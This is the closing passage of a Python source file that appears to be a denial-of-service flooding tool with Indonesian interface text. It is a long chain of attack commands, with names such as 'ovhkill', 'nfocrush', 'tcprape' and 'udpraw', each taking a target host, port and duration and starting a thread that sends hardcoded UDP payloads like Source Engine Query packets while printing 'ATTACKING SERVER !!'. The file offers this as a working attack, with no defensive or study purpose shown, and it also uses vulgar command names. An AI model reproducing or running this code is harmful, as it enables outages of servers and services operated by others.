					print("\033[97mATTACKING SERVER !!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
					print (done)
					time.sleep(2)
					print (pcl)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
					print (done)
					time.sleep(2)
					print (pcl)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
